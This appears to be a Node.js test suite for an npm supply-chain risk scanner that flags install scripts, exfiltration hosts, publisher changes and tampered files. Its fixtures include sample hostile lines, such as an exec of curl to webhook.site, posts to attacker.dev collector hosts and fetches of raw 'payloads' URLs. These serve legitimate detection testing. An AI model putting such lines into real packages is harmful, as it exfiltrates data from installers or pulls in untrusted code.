import assert from 'node:assert/strict'
import { Buffer } from 'node:buffer'
import { createHash } from 'node:crypto'
import { test } from 'node:test'
import { gzipSync } from 'node:zlib'
import publishers from '@preventive/publishers/npm.js'
import { DEFAULT_MINIMUM_RELEASE_AGE, NpmRiskError, assessNpm, npmFileRisk } from '../risk/index.js'
import { linesNote } from '../ui/view/file-runs-code.js'
import { npmVersionManifest } from '../risk/npm/manifest.js'
import { MAX_TAR_BYTES, npmTarballVersion } from '../risk/npm/tarball.js'
import { npmFilesDiff } from '../risk/npm/diff.js'
import { npmCompareFindings } from '../risk/npm/compare.js'
import { npmAddedDependency } from '../risk/npm/new-dependency.js'
import { npmSettledDownloads } from '../risk/npm/downloads.js'
import { REGISTRY, packageOf } from './_managed-npm.js'

const DAY = 24 * 60 * 60_000
const NOW = Date.parse('2026-10-12T12:00:00Z')
const ago = days => new Date(NOW - days * DAY).toISOString()

// A package's whole document, as npm's registry has it, of `{ name, versions:
// [{ doc, published }], created? }`.
const documentOf = ({ name, versions, created }) => ({ name, versions: Object.fromEntries(versions.map(({ doc }) => [doc.version, doc])),
  time: { created: created ?? versions[0].published, modified: versions.at(-1).published, ...Object.fromEntries(versions.map(({ doc, published }) => [doc.version, published])) } })

// npm's registry and downloads API for `packages`, each `{ name, versions:
// [{ doc, tgz, published }], created? }`, and `downloads` by name; each URL
// asked, in order.
function npm(t, packages, downloads = {}) {
  const asked = []
  t.mock.method(globalThis, 'fetch', input => Promise.resolve(answer(String(input))))
  const answer = url => {
    asked.push(url)
    if (url.startsWith('https://api.npmjs.org/downloads/range/')) {
      const name = decodeURIComponent(url.split('/').at(-1))
      return downloads[name] ? Response.json(downloads[name]) : Response.json({ error: `package ${name} not found` }, { status: 404 })
    }
    for (const pkg of packages) {
      if (url === `${REGISTRY}/${pkg.name}`) return Response.json(documentOf(pkg))
      for (const { doc, tgz } of pkg.versions) if (url === doc.dist.tarball) return new Response(tgz)
    }
    return Response.json({ error: 'Not found' }, { status: 404 })
  }
  return asked
}

// A cache kept in a Map, noting each type written.
function store() {
  const kept = new Map(), written = new Set()
  return { kept, written, read: (type, key) => Promise.resolve(kept.get(`${type} ${key}`) ?? null), write: (type, key, value) => { written.add(type); kept.set(`${type} ${key}`, value); return Promise.resolve() } }
}

const version = (name, number, files, extra, published) => ({ ...packageOf(name, number, files, extra), published })
const ids = assessment => assessment.findings.map(({ id }) => id)

test('a version alone: what it holds, its files stamped, too new under the minimum release age', async t => {
  const files = { 'package.json': '{"name":"lone"}', 'index.js': 'require("child_process").exec("curl https://webhook.site/x")\n', 'README.md': '# lone' }
  npm(t, [{ name: 'lone', versions: [version('lone', '1.0.0', files, { dependencies: {}, scripts: { postinstall: 'node setup.js' } }, ago(1))] }])
  const assessment = await assessNpm('lone', '1.0.0', { now: NOW, downloads: false })
  assert.equal(assessment.published, ago(1))
  assert.deepEqual(ids(assessment), ['held-install-scripts', 'held-runs-code', 'held-exfiltration', 'too-new'], 'as the Overview flags a version on its own')
  assert.deepEqual(assessment.findings.find(({ id }) => id === 'held-runs-code'), { id: 'held-runs-code', severity: 'high', files: [{ path: 'index.js', found: { 'child-process': [1] } }] })
  assert.deepEqual(assessment.findings[0], { id: 'held-install-scripts', severity: 'high', scripts: [['postinstall', 'node setup.js']] })
  assert.equal(assessment.findings.find(({ id }) => id === 'held-exfiltration').severity, 'critical', 'a host that catches what is sent to it')
  assert.deepEqual(assessment.files['index.js'].stamps, [{ name: 'child_process', severity: 'high' }, { name: 'Exfiltration', severity: 'critical' }])
  assert.deepEqual(assessment.files['index.js'].exfiltration, { 'webhook-site': [1] })
  assert.deepEqual(assessment.files['README.md'].stamps, [])
  assert.equal(DEFAULT_MINIMUM_RELEASE_AGE, 14 * DAY)
  assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW, downloads: false, minimumReleaseAge: 0 })).includes('too-new'), 'none under a minimum of 0, as own scopes take')
  assert.ok(!ids(await assessNpm('lone', '1.0.0', { now: NOW + 14 * DAY, downloads: false })).includes('too-new'), 'none once old enough')
})

test('the services a version\'s files name, a finding a hosts\' tag at its severity; against the version before, those new to a file a level higher', async t => {
  const before = version('hosted', '1.0.0', { 'package.json': '{}', 'lib/a.js': 'get("https://api.ipify.org")\n' }, { dependencies: {} }, ago(30))
  const after = version('hosted', '1.1.0', { 'package.json': '{}', 'lib/a.js': 'get("https://api.ipify.org")\npost("https://webhook.site/x")\n',
    'lib/b.js': 'bot("https://api.telegram.org/bot")\nget("https://ifconfig.me")\n' }, { dependencies: {} }, ago(20))
  npm(t, [{ name: 'hosted', versions: [before, after] }])
  const hosts = (assessment, prefix) => assessment.findings.filter(({ id }) => ['exfiltration', 'remote', 'ip-lookup'].some(tag => id === `${prefix}${tag}`))
    .map(({ id, severity, files }) => `${id} ${severity}: ${files.map(row => `${row.path} ${Object.keys(row.found ?? row.added).join(',')}`).join('; ')}`)
  const alone = await assessNpm('hosted', '1.1.0', { now: NOW, downloads: false })
  assert.deepEqual(hosts(alone, 'held-'), ['held-exfiltration critical: lib/a.js webhook-site', 'held-remote high: lib/b.js telegram',
    'held-ip-lookup moderate: lib/a.js ipify; lib/b.js ifconfig-me'], 'red, orange and yellow')
  assert.deepEqual(alone.files['lib/b.js'].stamps, [{ name: 'Remote', severity: 'high' }, { name: 'IP lookup', severity: 'moderate' }])
  const compared = await assessNpm('hosted', '1.1.0', { oldVersion: '1.0.0', now: NOW, downloads: false })
  assert.deepEqual(hosts(compared, ''), ['exfiltration critical: lib/a.js webhook-site', 'remote critical: lib/b.js telegram', 'ip-lookup high: lib/b.js ifconfig-me'],
    'never past red; ipify, named already, none')
})

test('against the version before: what it adds and changes, its publisher and provenance, and a new dependency\'s package', async t => {
  const known = publishers[0]
  const before = version('axios-like', '1.0.0', { 'package.json': '{}', 'lib/axios.js': 'require("follow-redirects")\n' },
    { dependencies: { 'follow-redirects': '^1.15.6' }, scripts: {}, _npmUser: { name: known } }, ago(30))
  before.doc.dist.attestations = { provenance: { predicateType: 'https://slsa.dev/provenance/v1' } }
  const after = version('axios-like', '1.0.1', { 'package.json': '{}', 'lib/axios.js': 'require("follow-redirects")\n' },
    { dependencies: { 'follow-redirects': '^1.15.6', 'crypto-like': '^4.2.1' }, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(20))
  const dependency = version('crypto-like', '4.2.1', { 'package.json': '{}', 'setup.js': '' }, { scripts: { postinstall: 'node setup.js' } }, ago(20.5))
  npm(t, [{ name: 'axios-like', versions: [before, after] }, { name: 'crypto-like', versions: [dependency] }])
  const assessment = await assessNpm('axios-like', '1.0.1', { oldVersion: '1.0.0', now: NOW })
  assert.deepEqual(ids(assessment), ['publisher', 'provenance-lost', 'unused-deps'])
  assert.deepEqual(assessment.findings[0], { id: 'publisher', was: known, now: 'someone-new', wasKnown: true, nowKnown: false, severity: 'critical' })
  assert.deepEqual(assessment.findings[2].dependencies, [{ name: 'crypto-like', kind: null, range: '^4.2.1' }])
  const [added] = assessment.dependencies.added
  assert.equal(added.name, 'crypto-like')
  assert.deepEqual(added.flags.map(({ check }) => check), ['unimported'])
  assert.deepEqual([added.tier, added.level, added.uncounted, added.month, added.created, added.gap], [null, 'is-unpopular', true, undefined, ago(20.5), 0.5 * DAY],
    'npm counts none of its downloads: unpopular, saying so, first published half a day before the open version')
})

test('against the version before, its tarball read only where its files could change what is found', async t => {
  const files = { 'package.json': '{}', 'index.js': 'module.exports = require("./lib")\n', 'lib/index.js': 'module.exports = 1\n' }
  const before = version('gated', '1.0.0', files, { dependencies: {}, scripts: {} }, ago(60))
  const after = version('gated', '1.0.1', { ...files, 'lib/index.js': 'module.exports = 2\n' }, { dependencies: {}, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(40))
  const hosted = version('gated', '1.0.2', { ...files, 'lib/index.js': 'get("https://collector.attacker.dev/x")\n' },
    { dependencies: {}, scripts: {}, _npmUser: { name: 'someone-new' } }, ago(20))
  const asked = npm(t, [{ name: 'gated', versions: [before, after, hosted] }])
  const tarballs = () => asked.filter(url => url.endsWith('.tgz'))
  assert.deepEqual(ids(await assessNpm('gated', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })), ['publisher'], 'its manifest told by npm\'s document')
  assert.deepEqual(tarballs(), [after.doc.dist.tarball], 'nothing of its files a file finding flags: 1.0.0\'s files not read')
  asked.length = 0
  assert.deepEqual(ids(await assessNpm('gated', '1.0.2', { oldVersion: '1.0.1', now: NOW, downloads: false })), ['new-hosts'])
  assert.deepEqual(tarballs(), [hosted.doc.dist.tarball, after.doc.dist.tarball], 'a host it names: 1.0.1\'s read, for whether it named it')
  const gyp = { 'package.json': '{}', 'binding.gyp': '{}' }
  const built = version('built', '1.0.0', gyp, { dependencies: {}, scripts: {} }, ago(60))
  const rebuilt = version('built', '1.0.1', { ...gyp, 'addon.cc': '' }, { dependencies: {}, scripts: { install: 'node-gyp rebuild' } }, ago(40))
  const read = npm(t, [{ name: 'built', versions: [built, rebuilt] }])
  assert.deepEqual(ids(await assessNpm('built', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })), [], 'node-gyp ran for 1.0.0\'s binding.gyp all the same')
  assert.deepEqual(read.filter(url => url.endsWith('.tgz')), [rebuilt.doc.dist.tarball, built.doc.dist.tarball], 'install scripts, and 1.0.0\'s naming none: its files read')
})

test('a package few download is flagged as unpopular, but where its popularity isn\'t asked, as own scopes take', async t => {
  const asked = npm(t, [{ name: 'own', versions: [version('own', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(400))] }],
    { own: { start: '2026-08-01', end: '2026-10-11', downloads: [] } })
  assert.ok(ids(await assessNpm('own', '1.0.0', { now: NOW })).includes('popularity'))
  asked.length = 0
  assert.ok(!ids(await assessNpm('own', '1.0.0', { now: NOW, popularity: false })).includes('popularity'))
  assert.ok(!asked.some(url => url.startsWith('https://api.npmjs.org/downloads/')), 'nor its downloads asked')
})

test('a host where packages keep their code and docs, named anew, calls for no look; a host under it, or a repository it serves files from, does', () => {
  const side = files => ({ kind: 'sourcemap', npm: { manifest: {} }, json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
  const base = side({ 'index.js': 'module.exports = 1\n' })
  const other = side({ 'index.js': 'module.exports = 1\n', 'lib/links.js': 'warn("https://github.com/lit/lit/issues")\nwarn("https://lit.dev/msg/dev-mode")\nget("https://api.github.com/repos")\n'
    + 'get("https://github.com/someone/payloads/raw/main/x.js")\nget("https://github.com/someone/tool/releases/download/v1/tool.tgz")\n'
    + 'get("https://github.com/someone/latest/releases/latest/download/x.js")\nexec("git clone https://github.com/someone/cloned.git")\n'
    + 'get("https://github.com/someone/blobbed/blob/main/x.js?raw=true")\nget("https://github.com/someone/unheard/route/x")\n'
    + 'get("https://github.com:443/someone/ported/raw/main/x.js")\nget("https://github.com./someone/dotted/raw/x.js")\nget("https://github.com/x/../someone/climbed/raw/x.js")\n'
    + 'see("https://github.com/lit/lit/issues/1434")\nsee("https://github.com/google/safe-html-types/blob/master/doc/safehtml-types.md")\n'
    + 'see("See https://github.com/webcomponents/polyfills/tree/master/packages/shadycss#usage.")\nsee("https://github.com/ExodusOSS/bytes/blob/main/README.md")\n'
    + 'get("https://github.com/someone/patched/pull/1.patch")\nget("https://github.com/someone/diffed/commit/abc123.diff")\nsee("https://github.com/lit/lit/blob/main/fix.patch")\n'
    + 'get("https://github.com/someone/encoded/blob/main/x.js?raw=%31")\nget("https://github.com/someone/escaped/pull/1%2Epatch")\n'
    + 'const flagged = /https:\\/\\/github\\.com\\/someone\\/flagged\\/pull\\/1\\.patch/i\n'
    + 'get("https://github.com/someone/built/actions/runs/1/artifacts/2")\nget("https://github.com/SomeOne/Patched/pull/2.patch")\n'
    + 'exec("git clone https://github.com/someone/suffixless")\nget("https://en.wikipedia.org/w/index.php?title=User:someone/x.js&action=raw")\n'
    + 'see("https://github.com/lit/lit/blob/main/README.md#use")\nsee("https://github.com/lit/lit/releases/tag/v2.0.0")\nsee("https://github.com/sponsors/someone")\n' })
  const hosts = npmCompareFindings(base, other, { added: [], changed: [] }).find(({ id }) => id === 'new-hosts')?.hosts.map(({ host }) => host)
  assert.deepEqual(hosts, ['api.github.com', 'github.com/someone/payloads', 'github.com/someone/tool', 'github.com/someone/latest', 'github.com/someone/cloned',
    'github.com/someone/blobbed', 'github.com/someone/unheard', 'github.com/someone/ported', 'github.com/someone/dotted', 'github.com/someone/climbed',
    'github.com/someone/patched', 'github.com/someone/diffed', 'github.com/someone/encoded', 'github.com/someone/escaped', 'github.com/someone/flagged', 'github.com/someone/built', 'github.com/someone/suffixless',
    'en.wikipedia.org'],
    'github.com\'s pages and lit.dev allowed; api.github.com, a host under one, named, and every repository github.com serves what it holds from, by any path but a page')
})

test('a new dependency on the caller\'s own package is told no tier nor age, nor is npm asked of it', async t => {
  const before = version('app', '1.0.0', { 'package.json': '{}', 'index.js': '' }, { dependencies: {} }, ago(30))
  const after = version('app', '1.0.1', { 'package.json': '{}', 'index.js': 'require("@mine/fresh")\nrequire("stranger")\n' },
    { dependencies: { '@mine/fresh': '^1.0.0', stranger: '^1.0.0' } }, ago(20))
  const asked = npm(t, [{ name: 'app', versions: [before, after] }, { name: 'stranger', versions: [version('stranger', '1.0.0', { 'package.json': '{}' }, {}, ago(21))] }])
  const added = async options => Object.fromEntries((await assessNpm('app', '1.0.1', { oldVersion: '1.0.0', now: NOW, ...options })).dependencies.added.map(row => [row.name, row]))
  asked.length = 0
  assert.equal((await added({})).stranger.level, 'is-unpopular', 'npm counts none of its downloads')
  assert.ok(asked.some(url => url.includes('mine')), 'and is asked of @mine/fresh, as of any other')
  asked.length = 0
  const own = await added({ owned: name => Promise.resolve(name.startsWith('@mine/')) })
  assert.deepEqual([own['@mine/fresh'].level, own['@mine/fresh'].created, own.stranger.level], [undefined, undefined, 'is-unpopular'], 'the caller\'s own told nothing of, another as before')
  assert.ok(!asked.some(url => url.includes('mine')), 'nor its downloads nor its first publish asked')
})

test('whether each new dependency is the caller\'s own is asked four at a time, and no more once a hundred others are told', async t => {
  const scopes = Array.from({ length: 150 }, (_, i) => `@s${i}/p`)
  const before = version('wide', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(30))
  const after = version('wide', '1.0.1', { 'package.json': '{}' }, { dependencies: Object.fromEntries(scopes.map(name => [name, '^1.0.0'])) }, ago(20))
  const asked = npm(t, [{ name: 'wide', versions: [before, after] }])
  let calls = 0, most = 0, running = 0
  const owned = () => {
    calls++
    most = Math.max(most, ++running)
    return new Promise(resolve => { setImmediate(() => { running--; resolve(false) }) })
  }
  await assessNpm('wide', '1.0.1', { oldVersion: '1.0.0', now: NOW, owned })
  assert.ok(most <= 4, `${most} asked at once`)
  assert.ok(calls <= 103, `${calls} asked of 150, past the hundred told`)
  assert.equal(asked.filter(url => url.startsWith('https://api.npmjs.org/downloads/range/') && /s\d+(?:%2F|\/)p$/iu.test(url)).length, 100, 'a hundred told, as before')
})

test('a file become unreadable calls for less where its source map was rebuilt with it, or in a major release, as a publisher changed does', () => {
  const side = (at, files, manifest = {}) => ({ kind: 'sourcemap', npm: { name: 'built', version: at, manifest },
    json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
  const short = 'a\n'.repeat(10)
  const long = name => `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}.map\n`
  const found = (base, other) => Object.fromEntries(npmCompareFindings(base, other, { added: [], changed: [] })
    .filter(({ id }) => id === 'now-unreadable' || id === 'publisher').map(({ id, ...finding }) => [id, finding]))
  const map = mappings => JSON.stringify({ version: 3, mappings })
  const edited = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('A') }))
  assert.equal(edited['now-unreadable'].severity, 'critical', 'its map as it was')
  const rebuilt = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('B') }))
  assert.equal(rebuilt['now-unreadable'].severity, 'high')
  assert.deepEqual(rebuilt['now-unreadable'].files.map(row => row.rebuilt), [true])
  assert.equal(found(side('1.0.0', { 'a.css': short, 'a.css.map': map('A') }), side('1.0.1', { 'a.css': `${'x'.repeat(3000)}\n/*# sourceMappingURL=a.css.map */\n`, 'a.css.map': map('B') }))['now-unreadable']?.severity,
    'high', 'its map named in a block comment')
  const indexed = sections => JSON.stringify({ version: 3, sections: [{ offset: { line: 0, column: 0 }, map: JSON.parse(map(sections)) }] })
  assert.equal(found(side('1.0.0', { 'a.js': short, 'a.js.map': indexed('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': indexed('B') }))['now-unreadable'].severity,
    'high', 'an indexed map rebuilt')
  assert.equal(found(side('1.0.0', { 'a.js': short, 'a.js.map': indexed('A') }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': '{"version":3,"sections":[null]}' }))['now-unreadable'].severity,
    'critical', 'an indexed map whose sections are none')
  const elsewhere = found(side('1.0.0', { 'lib/a.js': short, 'lib/a.js.map': map('A'), 'maps/a.map': map('A') }),
    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=../maps/a.map\n`, 'lib/a.js.map': map('B'), 'maps/a.map': map('A') }))
  assert.equal(elsewhere['now-unreadable'].severity, 'critical', 'the map it names as it was, whatever map beside it changed')
  const named = found(side('1.0.0', { 'lib/a.js': short, 'maps/a.map': map('A') }),
    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=../maps/a.map\n`, 'maps/a.map': map('B') }))
  assert.equal(named['now-unreadable'].severity, 'high', 'the map it names, by a path from its own, rebuilt')
  const inline = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A') }),
    side('1.0.1', { 'a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=data:application/json;base64,e30=\n`, 'a.js.map': map('B') }))
  assert.equal(inline['now-unreadable'].severity, 'critical', 'a map inline is no map rebuilt beside it')
  for (const name of ['/a.js.map', '//cdn.example/a.js.map', '\\\\cdn.example/a.js.map', '/package/lib/a.js.map', 'https://package.invalid/package/lib/a.js.map', 'https://one.invalid/one/lib/a.js.map', '//two.invalid/two/lib/a.js.map', '/one/lib/a.js.map', 'cdn.example%2Fa.js.map', 'a.js.map*elsewhere', 'a.js.map#x']) {
    const rooted = found(side('1.0.0', { 'lib/a.js': short, 'lib/a.js.map': map('A'), 'lib/cdn.example/a.js.map': map('A') }),
      side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}\n`, 'lib/a.js.map': map('B'), 'lib/cdn.example/a.js.map': map('B') }))
    assert.equal(rooted['now-unreadable'].severity, 'critical', `${name}: a map from a site's root or another host is none beside it`)
  }
  for (const [path, name] of [['a.js', '../a.js.map'], ['lib/a.js', '../../a.js.map'], ['lib/a.js', '%2e%2e/%2E%2e/a.js.map']]) {
    const above = found(side('1.0.0', { [path]: short, 'a.js.map': map('A') }),
      side('1.0.1', { [path]: `${'x'.repeat(3000)}\n//# sourceMappingURL=${name}\n`, 'a.js.map': map('B') }))
    assert.equal(above['now-unreadable'].severity, 'critical', `${path} naming ${name}: a map above the package is none of its own`)
  }
  const encoded = found(side('1.0.0', { 'lib/a.js': short, 'a.js.map': map('A'), 'lib/%2e%2e/a.js.map': map('A') }),
    side('1.0.1', { 'lib/a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=%2e%2e/a.js.map\n`, 'a.js.map': map('A'), 'lib/%2e%2e/a.js.map': map('B') }))
  assert.equal(encoded['now-unreadable'].severity, 'critical', 'the map an encoded `..` names, as a browser resolves it, as it was')
  const text = 'module.exports = function long() { return 42 }\n'.repeat(40)
  const grown = `${text}${'x'.repeat(3000)}\n//# sourceMappingURL=a.js.map\n`
  const renamed = (was, now) => found(side('1.0.0', { 'src/a.js': text, ...was }), side('1.0.1', { 'dist/a.js': grown, ...now }))['now-unreadable'].severity
  assert.deepEqual([renamed({ 'dist/a.js.map': map('A') }, { 'dist/a.js.map': map('A') }), renamed({ 'src/a.js.map': map('A') }, { 'dist/a.js.map': map('A') }),
    renamed({ 'src/a.js.map': map('A') }, { 'dist/a.js.map': map('B') })], ['critical', 'critical', 'high'], 'renamed: the map where it lands as it was, or moved with it as it was; rebuilt')
  const manifest = found(side('1.0.0', { 'a.js': short, 'package.json': '{"version":"1.0.0"}' }),
    side('1.0.1', { 'a.js': `${'x'.repeat(3000)}\n//# sourceMappingURL=package.json\n`, 'package.json': '{"version":"1.0.1"}' }))
  assert.equal(manifest['now-unreadable'].severity, 'critical', 'a file it names that is no source map, changed as it may be')
  const fake = found(side('1.0.0', { 'a.js': short, 'a.js.map': 'x' }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': 'y' }))
  assert.equal(fake['now-unreadable'].severity, 'critical', 'a .map that is no source map')
  const mixed = found(side('1.0.0', { 'a.js': short, 'a.js.map': map('A'), 'b.js': short }), side('1.0.1', { 'a.js': long('a.js'), 'a.js.map': map('B'), 'b.js': long('b.js') }))
  assert.equal(mixed['now-unreadable'].severity, 'critical', 'one file of them unexplained')
  const major = found(side('1.4.1', { 'a.js': short }, { publisher: 'known', knownAccounts: ['known'] }), side('2.0.0', { 'a.js': long('a.js') }, { publisher: 'new' }))
  assert.deepEqual([major['now-unreadable'].severity, major['now-unreadable'].major, major.publisher.severity, major.publisher.major], ['high', true, 'high', true])
  assert.equal(found(side('0.1.5', { 'a.js': short }), side('0.2.0', { 'a.js': long('a.js') }))['now-unreadable'].severity, 'high', '0.x: its minor is its major')
  assert.equal(found(side('1.4.1', { 'a.js': short }), side('1.5.0', { 'a.js': long('a.js') }))['now-unreadable'].severity, 'critical', 'a minor release')
})

test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
  const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
  const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
    { kept: { start: '2026-08-01', end: '2026-10-11', days: Array.from({ length: 72 }, () => 10) } })
  const cache = store()
  const first = await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache })
  assert.deepEqual(ids(first), ['kept-runs-code', 'new-hosts', 'popularity'], 'eval kept from 1.0.0; a host named anew; few downloads')
  assert.deepEqual(first.findings.at(-1), { id: 'popularity', severity: 'critical', tier: null, level: 'is-unpopular' })
  assert.deepEqual([...cache.written].toSorted(), ['npm/tarballs', 'risk/npm/assessments', 'risk/npm/downloads', 'risk/npm/packages', 'risk/npm/versions'])
  asked.length = 0
  assert.deepEqual(await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW, cache }), first)
  assert.deepEqual(asked, [], 'everything kept: npm isn\'t asked')
  asked.length = 0
  await assessNpm('kept', '1.1.0', { oldVersion: '1.0.0', now: NOW + DAY, cache })
  assert.deepEqual(asked.map(url => url.replace(/range\/[^/]+/u, 'range/…')), [`${REGISTRY}/kept`, 'https://api.npmjs.org/downloads/range/…/kept'],
    'a day on, its deprecations asked again, as they are after an hour, and its downloads, another day\'s; no tarball')
})

test('npm having no such package or version is said so', async t => {
  npm(t, [{ name: 'there', versions: [version('there', '1.0.0', { 'package.json': '{}' }, {}, ago(30))] }])
  await assert.rejects(assessNpm('there', '9.9.9', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'version-not-found')
  await assert.rejects(assessNpm('missing', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'package-not-found')
})

test('a tarball unpacking past risk\'s bounds is given up on as it unpacks', async t => {
  const bomb = version('bomb', '1.0.0', { 'package.json': '{}' }, {}, ago(30))
  bomb.tgz = gzipSync(Buffer.alloc(MAX_TAR_BYTES + 1))
  bomb.doc.dist.integrity = `sha512-${createHash('sha512').update(bomb.tgz).digest('base64')}`
  await assert.rejects(npmTarballVersion(bomb.tgz), /package-too-large/u)
  npm(t, [{ name: 'bomb', versions: [bomb] }])
  await assert.rejects(assessNpm('bomb', '1.0.0', { now: NOW, downloads: false }), error => error instanceof NpmRiskError && error.code === 'package-too-large')
})

test('npm\'s documents read within bounds: risk\'s own, or the caller\'s in its stead', async t => {
  const MiB = new Uint8Array(1024 * 1024)
  const endless = () => { let sent = 0; return new ReadableStream({ pull: controller => { if (sent++ > 64) controller.close(); else controller.enqueue(MiB) } }) }
  t.mock.method(globalThis, 'fetch', () => Promise.resolve(new Response(endless())))
  await assert.rejects(assessNpm('huge', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'upstream-too-large', 'past 64 MiB, no length said')
  t.mock.restoreAll()
  const own = { name: 'hooked', versions: [version('hooked', '1.0.0', { 'package.json': '{}' }, { dependencies: { 'dep-like': '^1.0.0' } }, ago(30))] }
  const dependency = { name: 'dep-like', versions: [version('dep-like', '1.0.0', { 'package.json': '{}' }, {}, ago(31))] }
  const asked = npm(t, [own, dependency]), read = []
  const packument = (name, { authorized }) => { read.push([name, authorized]); return Promise.resolve(documentOf(name === 'hooked' ? own : dependency)) }
  const tarball = (name, number) => { read.push([`${name}@${number}`]); return Promise.resolve(own.versions[0].tgz) }
  const assessment = await assessNpm('hooked', '1.0.0', { now: NOW, packument, tarball })
  assert.deepEqual(read, [['hooked', true], ['hooked@1.0.0'], ['dep-like', false]], 'the package assessed with the caller\'s token, its dependency without; its tarball the caller\'s')
  assert.ok(!asked.some(url => url.startsWith(REGISTRY)), 'npm\'s registry asked nothing')
  const busy = new Error('npm-busy')
  await assert.rejects(assessNpm('hooked', '1.0.0', { now: NOW, packument, tarball: () => Promise.reject(busy) }), error => error === busy, 'a caller\'s failure thrown as it is')
  assert.equal(assessment.dependencies.added[0].level, 'is-unpopular', 'its document read: public, none of its downloads counted')
})

test('npm asked of at most 100 dependencies added, the rest left unknown; npm unreachable said so', async t => {
  const dependencies = Object.fromEntries(Array.from({ length: 120 }, (_, i) => [`dep-${String(i).padStart(3, '0')}`, '^1.0.0']))
  const asked = npm(t, [{ name: 'many', versions: [version('many', '1.0.0', { 'package.json': '{}' }, { dependencies }, ago(30))] }])
  const { added } = (await assessNpm('many', '1.0.0', { now: NOW })).dependencies
  assert.equal(added.length, 120)
  const downloads = asked.filter(url => url.startsWith('https://api.npmjs.org/downloads/range/')).map(url => url.split('/').at(-1)).filter(name => name !== 'many')
  assert.deepEqual(downloads.toSorted(), Object.keys(dependencies).slice(0, 100))
  t.mock.method(globalThis, 'fetch', () => Promise.reject(new TypeError('fetch failed')))
  await assert.rejects(assessNpm('many', '1.0.0', { now: NOW }), error => error instanceof NpmRiskError && error.code === 'upstream-unavailable')
})

test('a tarball read as npm installs it, and two versions\' files paired as Compare pairs them', async () => {
  const { tgz } = packageOf('read', '1.0.0', { 'package.json': '{}', 'b.js': 'b', 'a/c.js': 'c', 'bin/tool': '\0\u0001' })
  const read = await npmTarballVersion(tgz)
  assert.deepEqual(read.json, { version: 3, sources: ['a/c.js', 'b.js', 'bin/tool', 'package.json'], sourcesContent: ['c', 'b', null, '{}'] }, 'sorted; one with a NUL no text')
  assert.equal(read.fileSizes.get('bin/tool'), 2)
  assert.deepEqual(read.npmBinaries, new Map([['bin/tool', { size: 2, digest: `sha256-${createHash('sha256').update('\0\u0001').digest('base64')}` }]]), 'one not text told by its digest, as the server gives it')
  const side = files => ({ kind: 'sourcemap', json: { version: 3, sources: Object.keys(files), sourcesContent: Object.values(files) } })
  const text = 'module.exports = function long() { return 42 }\n'.repeat(20)
  assert.deepEqual(npmFilesDiff(side({ 'old.js': text, 'same.js': 'x', 'edit.js': '1' }), side({ 'new.js': text, 'same.js': 'x', 'edit.js': '2', 'add.js': 'y' })),
    { onlyOther: [{ path: 'add.js' }], changed: [{ path: 'edit.js', modified: true }, { path: 'new.js', renamedFrom: 'old.js', modified: false }] })
})

test('a file that isn\'t text compared by its digest: one added large is large code, one kept unchanged', async t => {
  const packed = Buffer.alloc(256 * 1024, 0xff), tool = Buffer.from([0, 1, 2])
  const before = version('bin-like', '1.0.0', { 'package.json': '{}', 'bin/tool': tool }, { dependencies: {} }, ago(30))
  const after = version('bin-like', '1.0.1', { 'package.json': '{}', 'bin/tool': tool, 'dist/packed.js': packed }, { dependencies: {} }, ago(20))
  npm(t, [{ name: 'bin-like', versions: [before, after] }])
  const assessment = await assessNpm('bin-like', '1.0.1', { oldVersion: '1.0.0', now: NOW, downloads: false })
  assert.deepEqual(assessment.findings, [{ id: 'large-code', severity: 'critical', files: [{ path: 'dist/packed.js', bytes: 256 * 1024 }] }], 'not UTF-8, yet added; bin/tool unchanged')
})

test('what a file holds read to a bound: the first 100 places of each kind, 1,000 hosts', () => {
  const lines = (count, line) => Array.from({ length: count }, (_, i) => line(i)).join('\n')
  const first = count => Array.from({ length: count }, (_, i) => i + 1)
  const evals = lines(150, () => 'eval(x)')
  assert.deepEqual(npmFileRisk('lib/a.js', evals, evals.length).runsCode, new Map([['eval', first(100)]]))
  const said = lines(150, () => '// see https://webhook.site/x')
  assert.deepEqual(npmFileRisk('lib/b.js', said, said.length).exfiltration, new Map([['webhook-site', first(100)]]))
  const named = lines(1200, i => `fetch("https://h${i}.attacker.dev/")`)
  const { hosts } = npmFileRisk('lib/c.js', named, named.length)
  assert.deepEqual([hosts.size, hosts.get('h999.attacker.dev'), hosts.has('h1000.attacker.dev')], [1000, 1000, false])
  assert.equal(linesNote(first(100)), 'lines 1, 2, 3, 4, 5 and 95+ more', 'as many as risk keeps: some more yet')
  assert.equal(linesNote(first(99)), 'lines 1, 2, 3, 4, 5 and 94 more')
})

